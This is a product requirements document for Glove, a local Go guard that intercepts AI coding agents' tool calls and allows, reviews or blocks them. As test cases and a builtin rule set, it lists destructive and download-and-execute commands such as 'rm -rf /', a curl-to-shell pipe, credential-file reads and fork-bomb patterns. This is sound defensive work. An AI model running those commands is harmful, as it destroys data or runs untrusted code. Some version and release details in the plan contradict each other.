# Glove — Product Requirements Document

**Binary name**: `glove`  
**Version**: v1.0 target  
**Status**: Final — ready for implementation  
**Language**: Go  
**Repo**: `github.com/<org>/glove`  
**Tagline**: *The LLM has a hand — tool calling. Glove is what it wears to act safely.*

---

## 1. Executive Summary

Glove is a single-binary local guard for AI Agent tool calls. Installed at the `PreToolUse` hook point of Claude Code, Kilocode, Codex, OpenCode, Cursor, Gemini CLI, and Zed, it intercepts every tool invocation *before execution*, makes a three-way decision — **allow / review / block** — and writes an immutable audit record.

The decision engine is layered:

1. **Layer 0** — deterministic Go-native rules (hard-block, force-confirm, protected paths). Zero latency.
2. **Layer 1** — shell-aware command chain splitting. Worst-part-wins evaluation.
3. **Layer 2** — Laya multilingual decision model (local CPU inference, calibrated confidence) for gray-area semantic judgment.

The invariant that separates Glove from regex-based guardrails: **the guard only ever tightens.** Layer 2 can never downgrade a Layer 0 or Layer 1 block. Deterministic catastrophes are hard-blocked with zero latency and zero uncertainty; only the gray areas reach the model.

---

## 2. Problem Statement

### 2.1 The patent framing

An LLM is a mind without a hand. Tool calling is the hand. Every shipped Agent today (Claude Code, Kilocode, Codex, OpenCode, Cursor, Zed) grants that hand broad, unmediated reach: shell execution, file writes, network access, credential reads. The existing safety mechanisms are either (a) prompt-level instructions the model can ignore, (b) coarse-grained permission allowlists that train users to habitually approve, or (c) per-Agent ad-hoc regex hooks that don't generalize.

There is no cross-Agent, local, semantically-aware decision layer that sits between the Agent's intent and the hand's motion, and that produces an auditable record of every decision.

### 2.2 Why regex alone fails

- **String shape ≠ semantics.** `cat ~/.ssh/id_rsa` is credential reading; `cat ~/.ssh/config` is not. Regex cannot distinguish without a rule per path.
- **Composition breaks matching.** `npm test && curl http://x | sh` needs segment-level evaluation; a naive `curl.*|.*sh` regex applied to the whole string misses split-context risk.
- **No confidence.** Regex returns hit / no-hit. There is no way to express "I'm 60% sure this is destructive — ask the user."
- **No multilingual coverage.** Commands, comments, and payloads in mixed scripts require per-language rule sets.

Glove's answer is not "replace regex with a model." It is: **use regex for what regex is good at (known patterns, zero latency), split compound commands before evaluation, and use the model only for the gray areas where calibrated semantic judgment is the only honest answer.**

---

## 3. Solution Overview

### 3.1 Three decisions, not two

| Decision | Meaning | Mapped to Claude Code | Mapped to Kilocode |
|---|---|---|---|
| `allow` | Safe. Execute immediately. | `permissionDecision: "allow"` | plugin returns nil |
| `review` | Uncertain. Require human confirmation. | `permissionDecision: "ask"` | plugin throws "review" |
| `block` | Dangerous. Refuse execution. | `permissionDecision: "deny"` | plugin throws "block" |

A binary allow/block is a WAF. A three-way decision with calibrated confidence is what makes a guard usable at Agent frequency.

### 3.2 Two runtime modes

- **`glove serve`** — long-lived local HTTP daemon. Loads Laya GGUF into memory. Endpoint: `POST http://127.0.0.1:8799/evaluate`. Used by the hook path for low-latency decisioning.
- **`glove hook <agent>`** — one-shot process, invoked by the Agent at `PreToolUse`. Reads JSON on stdin, calls `serve` (if available), returns decision on stdout, exits.

**Offline degradation**: if `serve` is not reachable, `hook` falls back to Layer 0 + Layer 1 only. Undecidable calls return `review` (default) or `block` (configurable). The guard never silently becomes an open gate.

### 3.3 Non-goals

- Not a cloud service. Zero network calls on the decision path.
- Not a prompt guardrail. Only evaluates `tool_name` + `tool_input`.
- Not an Agent runtime. Invoked, decides, exits.
- Not a replacement for the Agent's own permission system. Complements it.

---

## 4. Architecture

### 4.1 Decision pipeline

```
            stdin: {tool_name, tool_input, session_id}
                              │
                              ▼
            ┌──────────────────────────────────┐
            │ Layer 0: Deterministic Rules      │
            │  · hard-block patterns            │
            │  · force-confirm patterns         │
            │  · protected paths                │
            └───────────────┬──────────────────┘
                            │ hit → return decision
                            │ miss
                            ▼
            ┌──────────────────────────────────┐
            │ Layer 1: Command Chain Splitter   │
            │  · shell-aware tokenization       │
            │  · segment-level rule evaluation  │
            │  · worst-part-wins                │
            └───────────────┬──────────────────┘
                            │ hit → return decision
                            │ miss
                            ▼
            ┌──────────────────────────────────┐
            │ Layer 2: Laya Decision Model      │
            │  (only if serve is running)       │
            │  · destructive?                   │
            │  · exfiltration?                  │
            │  · privilege_escalating?          │
            │  · blast_radius?                  │
            │  → allow / review / block         │
            │  + calibrated confidence          │
            └───────────────┬──────────────────┘
                            │
                            ▼
            ┌──────────────────────────────────┐
            │ Audit Writer (async, never blocks)│
            └───────────────┬──────────────────┘
                            │
                            ▼
                  stdout: decision JSON
```

### 4.2 "Only ever tightens" invariant

```
final = block if any_layer_returned_block
        else review if any_layer_returned_review
        else allow
```

Laya cannot downgrade a Layer 0 `block`. This must be enforced in code with a unit test that feeds a Layer 0 `block` through a mocked Laya response of `allow` and asserts the final decision is `block`.

### 4.3 Repository structure

```
glove/
├── cmd/
│   └── glove/
│       └── main.go                    # CLI dispatch
├── internal/
│   ├── cli/
│   │   ├── root.go
│   │   ├── serve.go
│   │   ├── hook.go
│   │   ├── install.go
│   │   ├── check.go
│   │   ├── audit.go
│   │   ├── policy.go
│   │   ├── doctor.go
│   │   └── list.go
│   ├── decision/
│   │   ├── engine.go                  # 3-layer pipeline
│   │   ├── rule.go                    # Layer 0
│   │   ├── chain.go                   # Layer 1
│   │   ├── laya.go                    # Layer 2 (client)
│   │   └── verdict.go                 # decision type + combination
│   ├── rules/
│   │   ├── builtin.yaml               # shipped rule set
│   │   └── loader.go
│   ├── server/
│   │   ├── server.go                  # HTTP daemon
│   │   └── laya_runtime.go            # Laya model load + inference
│   ├── adapter/
│   │   ├── adapter.go                 # AgentAdapter interface
│   │   ├── claude.go
│   │   ├── kilo.go
│   │   ├── codex.go
│   │   ├── opencode.go
│   │   ├── cursor.go
│   │   ├── gemini.go
│   │   └── zed.go                     # audit-only
│   ├── audit/
│   │   ├── writer.go
│   │   ├── reader.go
│   │   └── schema.go
│   ├── policy/
│   │   ├── schema.go
│   │   └── loader.go
│   └── paths/
│       └── paths.go                   # OS-specific config/data dirs
├── pkg/
│   └── contract/
│       └── decision.go                # public JSON contract
├── testdata/
│   ├── claude_hook_cases.json
│   ├── chain_split_cases.json
│   └── adversarial_benchmark.jsonl
├── docs/
│   ├── install/
│   │   ├── claude-code.md
│   │   ├── kilo.md
│   │   ├── codex.md
│   │   └── ...
│   ├── policy-cookbook.md
│   └── troubleshooting.md
├── PRD.md                             # this document
├── README.md
├── CHANGELOG.md
├── LICENSE                            # Apache-2.0
└── go.mod
```

---

## 5. Core Interfaces

### 5.1 AgentAdapter

```go
package adapter

import "context"

// Adapter is the contract every Agent integration implements.
// It is responsible for translating Glove's internal Verdict into
// the Agent-specific hook output, and for knowing where its config lives.
type Adapter interface {
    // Name returns the stable identifier used in CLI ("claude-code", "kilo").
    Name() string

    // Detect reports whether the Agent is installed on this machine.
    Detect() (installed bool, configPath string, err error)

    // Install writes the Glove hook into the Agent's config.
    // Must be idempotent. Must show a diff before writing.
    Install(ctx context.Context, opts InstallOptions) error

    // Uninstall removes the Glove hook. Must be idempotent.
    Uninstall(ctx context.Context) error

    // HookEntry is the CLI command the Agent will invoke on each hook event.
    // e.g. "glove hook claude-code"
    HookEntry() string

    // RenderVerdict translates a Verdict into the bytes to write to stdout.
    RenderVerdict(v Verdict) ([]byte, error)

    // ParseHookInput reads the Agent's stdin JSON into the internal HookInput.
    ParseHookInput(raw []byte) (HookInput, error)
}
```

### 5.2 HookInput (internal)

```go
package adapter

type HookInput struct {
    Agent     string          `json:"agent"`
    Event     string          `json:"event"`      // "PreToolUse", "PostToolUse"
    ToolName  string          `json:"tool_name"`  // "Bash", "Edit", "mcp__foo__bar"
    ToolInput json.RawMessage `json:"tool_input"` // Agent-specific shape
    SessionID string          `json:"session_id,omitempty"`
    CWD       string          `json:"cwd,omitempty"`
}
```

### 5.3 Verdict (public contract — frozen at 1.0.0)

```go
package contract

// Verdict is the outcome of a Glove decision. This struct is the
// stable public contract; treat it as API and version it.
type Verdict struct {
    Decision       Decision  `json:"decision"`         // "allow" | "review" | "block"
    Risk           Risk      `json:"risk"`             // "low" | "medium" | "high" | "critical"
    Confidence     float64   `json:"confidence"`       // [0,1], calibrated
    Reasons        []string  `json:"reasons"`          // human-readable
    Deterministic  bool      `json:"deterministic"`    // true if Layer 0 or 1 decided
    ModelAvailable bool      `json:"model_available"`  // false if serve was unavailable
    Questions      []QA      `json:"questions,omitempty"` // Layer 2 typed answers
    AuditID        string    `json:"audit_id"`         // UUID
    LatencyMs      int64     `json:"latency_ms"`
}

type QA struct {
    Question   string  `json:"question"`
    Answer     bool    `json:"answer"`
    Confidence float64 `json:"confidence"`
}

type Decision string
const (
    DecisionAllow  Decision = "allow"
    DecisionReview Decision = "review"
    DecisionBlock  Decision = "block"
)

type Risk string
const (
    RiskLow      Risk = "low"
    RiskMedium   Risk = "medium"
    RiskHigh     Risk = "high"
    RiskCritical Risk = "critical"
)
```

### 5.4 Audit record schema

```go
package audit

type Record struct {
    Ts             time.Time `json:"ts"`
    AuditID        string    `json:"audit_id"`
    Agent          string    `json:"agent"`
    SessionID      string    `json:"session_id,omitempty"`
    Tool           string    `json:"tool"`
    InputHash      string    `json:"input_hash"`        // SHA-256, hex
    InputRedacted  *string   `json:"input_redacted,omitempty"` // only in --audit-verbose
    Decision       string    `json:"decision"`
    Risk           string    `json:"risk"`
    Confidence     float64   `json:"confidence"`
    Deterministic  bool      `json:"deterministic"`
    ModelAvailable bool      `json:"model_available"`
    Reasons        []string  `json:"reasons"`
    LatencyMs      int64     `json:"latency_ms"`
    GloveVersion   string    `json:"glove_version"`
}
```

Written to `~/.local/share/glove/audit.jsonl` (macOS/Linux) or `%LOCALAPPDATA%\glove\audit.jsonl` (Windows). Rotation: 10 MB × 5 files.

### 5.5 Policy schema

```toml
# ~/.config/glove/policy.toml

[general]
mode = "standard"          # "standard" | "fast" (skip Laya) | "offline" (no serve)
on_model_unavailable = "review"  # "review" | "block"

[rules]
# User-extended hard-block patterns (regex, worst-part-wins)
hard_block = [
    "rm -rf /$",
    "\\bmkfs\\b",
]
# User-extended force-confirm patterns
force_confirm = [
    "\\bsudo\\b",
    "\\bgit\\s+push\\s+--force\\b",
]

[paths]
protected = [
    "~/.ssh/",
    "~/.aws/credentials",
    "~/.config/gh/hosts.yml",
    "**/.env",
    "**/.env.local",
]

[laya]
model_path = ""            # empty = auto-download to default location
confidence_review_band = [0.35, 0.75]   # outside = confident allow/block

[agents.claude-code]
enabled = true

[agents.kilo]
enabled = true
```

Project-level override: `.glove.toml` in the repo root. Precedence: project > user > built-in. `glove policy validate <file>` must give schema errors with line numbers.

---

## 6. CLI Surface (frozen at 1.0.0)

```bash
glove serve [--port 8799] [--model-path <gguf>]
glove hook <agent>                          # invoked by Agent
glove check "<cmd>" [--explain] [--offline] # manual check
glove install <agent> [--dry-run]           # dry-run = show diff only
glove uninstall <agent>
glove list                                  # installed agents + hook health
glove doctor                                # verify hook chains end-to-end
glove audit tail
glove audit query [--decision block] [--since 24h] [--agent claude-code]
glove audit export --format jsonl|csv --since <dur>
glove policy validate <file>
glove version
```

**Exit codes for `hook`** (matching Claude Code convention):
- `0` — allow or review (decision conveyed in stdout JSON)
- `2` — block (belt-and-braces: even if stdout is lost, exit 2 blocks)

All other exit codes are failures; Glove should never crash and return "open."

---

## 7. Version Roadmap

Each `0.X.0` is independently shippable. `1.0.0` is purely the stability marker.

### 0.1.0 — Claude Code + Layer 0

**Theme**: A working guard on one Agent with deterministic rules only.

**Deliverables**
- `cmd/glove/main.go` with subcommands: `hook`, `check`, `install`, `version`
- `internal/decision/rule.go` — hard-block, force-confirm, protected-path rules from `internal/rules/builtin.yaml`
- `internal/adapter/claude.go` — reads `.claude/settings.json` / `~/.claude/settings.json`, writes `PreToolUse` hook, shows diff, backs up to `settings.json.glove.bak`
- `internal/adapter/adapter.go` — `AgentAdapter` interface
- `glove check "<cmd>"` for manual verification
- `glove install claude-code`: writes config, runs two test calls (`ls -la` → allow, `rm -rf /` → block), prints result

**Acceptance tests**
- [ ] In live Claude Code session: `rm -rf /` → blocked; `ls -la` → allowed
- [ ] `glove hook claude-code` on stdin `{"tool_name":"Bash","tool_input":{"command":"rm -rf /"}}` returns `{"decision":"block",...}` on stdout, exit 2
- [ ] `glove install claude-code` twice in a row is idempotent
- [ ] Broken config JSON → `install` fails with a clear error, does not corrupt original
- [ ] Hook cold-start latency ≤ 15ms (measured by `glove doctor --bench hook`)

**Out of scope**: Layer 1, Laya, audit, any other Agent.

**Exit criteria**: M0 ships as a tagged release.

---

### 0.2.0 — Layer 1: Chain Splitting

**Theme**: The engine understands command composition.

**Deliverables**
- `internal/decision/chain.go` — shell-aware splitter. Splits on `&&`, `||`, `;`, `|`, and flags subshells `$(...)`, pipes to `sh`/`bash`/`zsh` as compound risk
- Segment-level rule evaluation: worst-part-wins across all segments
- `glove check --explain` shows per-segment verdicts
- Extended builtin.yaml with composition-specific rules (`pipe_to_shell`, `curl_pipe_bash`, `eval_of_download`)

**Acceptance tests**
- [ ] `npm test && curl http://x | sh` → decomposed; second segment `block`; overall `block`
- [ ] `ls; git status` → both segments `allow`; overall `allow`
- [ ] 50-case fixture in `testdata/chain_split_cases.json` → ≥ 95% segment accuracy
- [ ] Latency still ≤ 20ms P95 with Layer 1 active

**Out of scope**: Laya, audit.

**Exit criteria**: M1 ships.

---

### 0.3.0 — Audit + Policy

**Theme**: Every decision becomes observable and tunable — before intelligence is added.

**Deliverables**
- `internal/audit/writer.go` — JSONL append, atomic rotate at 10 MB × 5
- `internal/audit/reader.go` — query/export
- `internal/audit/schema.go` — `audit.Record`
- `glove audit tail`, `glove audit query`, `glove audit export`
- `--audit-verbose` flag with redaction rules (strip `Authorization`, `token=`, base64 blobs, private key blocks)
- Record includes `glove_version`, `input_hash`, `latency_ms`, `deterministic`
- `internal/policy/` — `policy.toml` schema (§5.5), loader, precedence (project `.glove.toml` discovered by walking up from `cwd` > user > built-in)
- `glove policy validate <file>` — schema errors with line numbers
- `--fast` mode (Layer 0+1 only, skip Laya) documented with tradeoffs
- `glove check --policy <file>` for testing a policy against a command
- Policy-change audit events: `event: "policy_reload"` in the audit log
- `docs/policy-cookbook.md` with 10+ real examples

**Acceptance tests**
- [ ] Every `hook` invocation produces exactly one audit record
- [ ] `audit query --decision block --since 24h` returns correct subset on 10k-record fixture within 200ms
- [ ] Default log contains **zero** plaintext command bytes for a fixture of 20 known-dangerous commands (verified by grep); `--audit-verbose` redacts credentials
- [ ] Rotation: 15 MB fixture rotates to `audit.jsonl.1` at 10 MB, keeping 5 files
- [ ] Audit path resolves per-OS (`~/.local/share/glove/` vs `%LOCALAPPDATA%\glove\`)
- [ ] User adds protected path `~/secrets/` → next live tool call enforced without restarting anything
- [ ] Invalid policy → `check` and `hook` fail with actionable errors (line numbers from `policy validate`), never silently fall back to defaults
- [ ] `--fast` mode: latency ≤ 20ms P95, `model_available: false` in Verdict
- [ ] Project-local `.glove.toml` overrides user-level policy for the same key (explicit test)

**Out of scope**: Laya, `serve`, new Agents.

**Exit criteria**: M2 ships. Users can observe AND tune the Layer 0+1 false-positive rate in the wild before Layer 2 lands.

---

### 0.4.0 — Layer 2: Laya + `serve` Mode

**Theme**: Semantic judgment in the gray areas. The single biggest capability jump.

**Deliverables**
- `cmd/glove/serve.go` — `glove serve` daemon on `127.0.0.1:8799`
- `internal/server/laya_runtime.go` — Laya container adapter (ADR 3): probes the laya-serve endpoint, asks the four questions over `POST /v1/systemone`, thread-safe
- `internal/server/server.go` — `POST /evaluate` accepting `HookInput`, returning `contract.Verdict` (partial)
- Four typed questions: `destructive`, `exfiltration`, `privilege_escalating`, `blast_radius`
- Calibration → decision mapping using `policy.laya.confidence_review_band`
- "Only ever tightens" invariant enforced in `internal/decision/engine.go` + unit test
- `hook` calls `serve` via HTTP with a bounded timeout (`[laya] hook_timeout_ms`); falls back to Layer 0+1 offline path
- First-run setup prompt: prints the laya container command (`docker run -p 8080:8080 ghcr.io/teochenglim/laya`), requires explicit `y`; optional `[laya] image_digest` pin verified on start — mismatch refuses (ADR 3)
- `--laya-endpoint` for a pre-running laya instance
- Audit `confidence`, `model_available`, `questions` populated

**Acceptance tests**
- [ ] P95 end-to-end latency ≤ 150ms on M1 MacBook Pro, 100-call fixture
- [ ] Offline mode (serve stopped): hook works, latency ≤ 5ms, `model_available: false` in Verdict
- [ ] **Invariant test**: Layer 0 returns `block`, mocked Laya returns `allow` → final `block`
- [ ] Adversarial benchmark (`testdata/adversarial_benchmark.jsonl`, 100 samples) → block-hit rate ≥ 90%
- [ ] Model checksum verification fails → serve refuses to load, prints actionable error
- [ ] No network call on decision path (verified by `strace` / `dtruss` in CI)

**Out of scope**: new Agents, policy engine.

**Exit criteria**: M3 ships. This is the flagship capability.

---

### 0.5.0 — Adapter matrix: Kilocode, Codex, OpenCode, Cursor, Gemini CLI, Zed

**Theme**: Complete the declared coverage matrix; the conformance suite is the gate.

**Deliverables** (sequenced inside the release — Kilocode first: structurally different, it proves the abstraction before the rest land)
- `internal/adapter/kilo.go` — TS shim into `~/.config/kilo/plugin/glove.ts`, calls local `glove serve`; handles `tool.execute.before`: `block` throws, `review` throws with a structured review code, `allow` returns nil; Windows PowerShell shim variant
- `internal/adapter/codex.go` — native `PreToolUse` hook, `updatedInput` passthrough (config path verified against current docs during implementation)
- `internal/adapter/opencode.go` — `tool.execute.before` shim (shares Kilocode lineage)
- `internal/adapter/cursor.go` — MCP wrapper intercepting MCP tool calls (config path verified)
- `internal/adapter/gemini.go` — JSON stdin/stdout hook adapter (hook surface verified)
- `internal/adapter/zed.go` — audit-only (Zed has no pre-tool hook surface); ships with `docs/install/zed.md` explaining the limitation and recommending Zed Tool Permissions (coarse) + Glove audit (fine-grained, post-hoc)
- `internal/adapter/adapter_test.go` + `testdata/conformance/` — the shared conformance harness every adapter must pass
- `glove list` — installed agents + hook health; `glove list --matrix` machine-verifies the README coverage matrix
- `glove doctor` — end-to-end verify each installed agent's hook chain
- `docs/install/*.md` for every supported agent, each with screenshot; `docs/adapter-authoring.md`
- Audit `agent:` field populated per adapter

**Acceptance tests**
- [ ] All five new agents pass the conformance suite; the `Adapter` interface is unchanged from 0.1.0
- [ ] Live Kilocode session: `rm -rf /` blocked, `ls` allowed; clean-machine install ≤ 2 min per docs
- [ ] Shim generated files are TypeScript-valid (tsc no errors)
- [ ] `glove doctor` detects a deliberately corrupted hook config on any installed agent
- [ ] `glove list` shows installed agents with green health; Zed appears as `mode: audit`
- [ ] Every supported agent has a working install + verify flow per its docs page; README coverage matrix is machine-verified by `glove list --matrix` (no "to be verified" rows)

**Out of scope**: production hardening (0.6.0).

**Exit criteria**: M4 ships. Coverage matrix complete and machine-verified.

---

### 0.6.0 — Release Candidate: Hardening

**Theme**: No new features. Fix everything that would block production.

**Deliverables**
- **Windows hardening**: `%LOCALAPPDATA%` audit path, process fork overhead measured and documented, path normalization for `~`
- **Cross-platform CI**: GitHub Actions matrix — macOS `amd64` + `arm64`, Windows `amd64`, Linux `amd64` + `arm64`
- **Performance regression gates** in CI: `hook` ≤ 15ms, `serve` P95 ≤ 150ms; fail build on regression
- **Security review**:
  - hook never executes Agent-proposed commands (unit + integration)
  - audit log never leaks plaintext by default (fixture)
  - model download verifies SHA-256
  - signed binaries with checksum file
- **Error-handling audit**: every failure path has a defined decision (never silent open gate); documented in `docs/failure-modes.md`
- **Signed releases**: the GitHub Actions release matrix is the vehicle (GoReleaser evaluated at 0.6.0 and not adopted — the existing workflow is the release path; decision recorded 2026-11-04), macOS notarization, Windows Authenticode
- **Docs completeness**: every Agent install guide ≤ 5 min; troubleshooting page; policy cookbook; `PRD.md` published in repo
- **Benchmark suite** published at `benchmarks/` with reproducibility instructions

**Acceptance tests**
- [ ] All-platform CI green for 2 consecutive weeks
- [ ] Zero P0/P1 issues open
- [ ] Signed binaries available for all platforms with published SHA-256
- [ ] New user (fresh VM) can install and verify any supported Agent in ≤ 5 min following docs (verified by an outside tester)
- [ ] No P0 from a 24-hour soak test in real Claude Code + Kilocode sessions

**Out of scope**: any feature not in 0.1.0–0.5.0.

**Exit criteria**: M5 ships as `0.6.0`. This is the production candidate.

---

### 1.0.0 — Production Ready

**Theme**: The version number *is* the release. No new code paths.

**Deliverables**
- Version bump only
- Stability commitment in README: `1.x` maintains CLI surface, `contract.Verdict` schema, `policy.toml` schema, and audit JSONL schema
- LTS statement: 12 months of security patches per minor
- Migration guide: `0.9.x` → `1.0.0` (expected: zero config changes)
- `CHANGELOG.md` consolidated
- GitHub Release marked "Latest"

**Acceptance tests**
- [ ] `1.0.0` is bit-identical in behavior to the last `0.9.x` RC except the version string (verified by running the conformance suite + benchmark against both)
- [ ] Release notes explicitly state: "This is a stability marker, not a feature release."

**Out of scope**: everything. New work goes to `1.1.0`.

**Exit criteria**: 1.0.0 tagged. Ship.

---

## 8. Non-Functional Requirements

| Metric | Target | Gate |
|---|---|---|
| Hook cold-start latency | ≤ 15ms | `make stress` release gate (shared CI runners turn wall-clock budgets into flakes — decided 2026-11-04) |
| `serve` P95 end-to-end | ≤ 150ms | `make stress` release gate |
| Offline fallback latency | ≤ 20ms | `make stress` release gate |
| Binary size (stripped) | ≤ 15 MB (excl. model) | Warning only |
| Model size | ~644 MB GGUF | Prompt before download |
| Platforms | macOS (amd64/arm64), Linux (amd64/arm64) | CI matrix. **Windows deferred** (2026-11-04): removed from CI and the release matrix after four consecutive windows-lane CI failures — all test plumbing, none product-affecting — while no interactive Windows pass exists; windows-aware code stays in the tree and compilable (`GOOS=windows` build/vet, `make stress` cross-compile). Reintroduce only with a real Windows test pass |
| Network on decision path | Zero | `strace`/`dtruss` in CI |
| Audit log plaintext leakage | Zero by default | Fixture test |
| Crash recovery | Never return "open" on internal error | Failure-mode audit |
| Config corruption | Idempotent, backups, verified diff before write | Integration test |

---

## 9. Distribution

- **Binaries**: GoReleaser → GitHub Releases per-platform tarball
- **Checksums**: `checksums.txt` with SHA-256 per artifact
- **macOS**: notarized + signed
- **Windows**: deferred — no windows artifacts ship (2026-11-04, PRD §8); Authenticode returns with windows support
- **Homebrew**: `brew install <org>/tap/glove`
- **Scoop**: `scoop install glove` (via manifest)
- **Direct**: `curl -sSL https://get.glove.dev | sh` (verifies checksum)
- **Model**: first `serve` prompts and downloads with SHA-256 verification; `--model-path` for airgapped deployments

---

## 10. Kickoff Instructions for the Coding Agent

**Start with 0.1.0 only.** Do not begin 0.2.0 until 0.1.0's acceptance tests all pass.

### 10.1 First 4 hours

1. `go mod init github.com/<org>/glove`
2. Create `internal/adapter/adapter.go` with the `Adapter` and `HookInput` types from §5.1
3. Create `pkg/contract/decision.go` with `Verdict`, `Decision`, `Risk`, `QA` from §5.3 — **do not change this file after 0.1.0 without a version bump**
4. Create `internal/adapter/claude.go` — read config, write hook, show diff, backup
5. Create `internal/decision/rule.go` — Layer 0 rules from `internal/rules/builtin.yaml`
6. Create `cmd/glove/main.go` with subcommand dispatch (use `spf13/cobra`)
7. Wire `glove check "<cmd>"` to Layer 0 only — first end-to-end test
8. Wire `glove hook claude-code` to Layer 0 → `contract.Verdict` → `claude.RenderVerdict` → stdout
9. Write `internal/decision/engine_test.go` with the invariant test stub (skip until 0.4.0)

### 10.2 Branching & PR discipline

- One branch per version: `release/0.1.0`, `release/0.2.0`, …
- Each PR must add its acceptance tests from §7; PR is blocked if any test is missing
- `CHANGELOG.md` updated in the same PR that ships a version
- No `0.X.0` branch merges until its predecessor is tagged

### 10.3 Testing tooling

- `go test ./...` for unit
- `testdata/fixtures/*.jsonl` for conformance
- `glove doctor --bench hook` for latency (implement in 0.1.0 even if trivial)
- CI matrix runs on all target platforms by 0.2.0

### 10.4 What NOT to do

- Do not add Layer 2 code before 0.4.0
- Do not add audit before 0.3.0
- Do not add a new Agent adapter without updating `internal/adapter/adapter_test.go` conformance suite
- Do not change `contract.Verdict` fields without a documented schema version bump
- Do not merge a PR that fails to show a config diff during `install`

### 10.5 Definition of "0.1.0 shipped"

- [ ] `glove version` prints `0.1.0`
- [ ] All 0.1.0 acceptance tests pass in CI (macOS + Linux)
- [ ] Tagged `v0.1.0` on GitHub with Release notes
- [ ] `README.md` shows the install snippet, the `glove check` demo, and the patent framing quote
- [ ] `docs/install/claude-code.md` is complete enough for a new user to install and verify in ≤ 5 min

---

## 11. Appendix A: Agent Hook Protocol Quick Reference

Consumed by the adapter layer. Each is a starting point, not exhaustive — verify against the Agent's current docs during implementation.

| Agent | Hook event | stdin shape | stdout decision | Config path |
|---|---|---|---|---|
| Claude Code | `PreToolUse` | `{"tool_name","tool_input","session_id",...}` | `{"hookSpecificOutput":{"hookEventName","permissionDecision","updatedInput"}}` | `.claude/settings.json` or `~/.claude/settings.json` |
| Kilocode | `tool.execute.before` | plugin function args (`{tool, sessionID, callID, args}`) | throw to block; return modified args to allow | `~/.config/kilo/plugin/*.ts` |
| Codex | `PreToolUse` | JSON on stdin | JSON with `permissionDecision`, `updatedInput` | `.codex/config.toml` (verify) |
| OpenCode | `tool.execute.before` | Kilocode lineage | Same as Kilocode | `~/.config/opencode/plugin/*.ts` (verify) |
| Cursor | MCP tool calls | MCP protocol | via MCP wrapper | `~/.cursor/mcp.json` (verify) |
| Gemini CLI | hook surface | JSON stdin/stdout | JSON | (verify during 0.8.0) |
| Zed | no pre-tool hook | n/a | audit-only via `PostToolUse`-equivalent or log file scan | n/a |

**"Verify" means: check the Agent's current docs during that version's implementation. Adapter interface is designed so a protocol change touches one file.**

---

## 12. Appendix B: Builtin Rule Set (Layer 0 seed)

Shipped in `internal/rules/builtin.yaml`. Users can extend via `policy.toml`.

```yaml
hard_block:
  - id: rm_root
    pattern: "rm\\s+(-[a-zA-Z]*f[a-zA-Z]*\\s+)?/(\\s|$)"
    reason: "recursive delete on /"
  - id: rm_root_wildcard
    pattern: "rm\\s+-[a-zA-Z]*r[a-zA-Z]*f[a-zA-Z]*\\s+/\\*"
    reason: "recursive force delete of root contents"
  - id: mkfs
    pattern: "\\bmkfs(\\.[a-z0-9]+)?\\b"
    reason: "filesystem format"
  - id: dd_to_device
    pattern: "\\bdd\\b.*\\bof=/dev/(sd|hd|nvme|disk)"
    reason: "raw write to block device"
  - id: fork_bomb
    pattern: ":\\(\\)\\s*\\{\\s*:\\|:&\\s*\\}\\s*;\\s*:"
    reason: "fork bomb"

force_confirm:
  - id: sudo
    pattern: "\\bsudo\\b"
    reason: "privilege escalation"
  - id: git_force_push
    pattern: "\\bgit\\s+push\\s+.*--force(?!-with-lease)\\b"
    reason: "force push without lease"
  - id: chmod_777
    pattern: "\\bchmod\\s+(-R\\s+)?777\\b"
    reason: "world-writable permissions"
  - id: curl_pipe_shell
    pattern: "\\b(curl|wget)\\b[^|]*\\|\\s*(ba|z|)sh\\b"
    reason: "download piped to shell"

protected_paths:
  - pattern: "**/.ssh/id_*"
    reason: "SSH private key"
  - pattern: "**/.aws/credentials"
    reason: "AWS credentials"
  - pattern: "**/.env"
    reason: ".env file"
  - pattern: "**/.env.*"
    reason: ".env variant"
  - pattern: "**/.config/gh/hosts.yml"
    reason: "GitHub CLI token"
```

Rule format: `{id, pattern, reason}`. `pattern` is Go `regexp` (RE2). Evaluated segment-by-segment after Layer 1 splits. **"only ever tightens" applies at this layer too**: a `force_confirm` hit in one segment cannot be downgraded by `allow` in another.

---

**End of PRD. Ready to hand to a coding agent.**

**Hand-off message to the coding agent**: *"Read PRD.md end to end. Start at §10.1. Do not proceed past 0.1.0's acceptance criteria until all boxes in §10.5 are checked. Ask me before any interface change in §5.3 (`contract.Verdict`) — that's the frozen API."*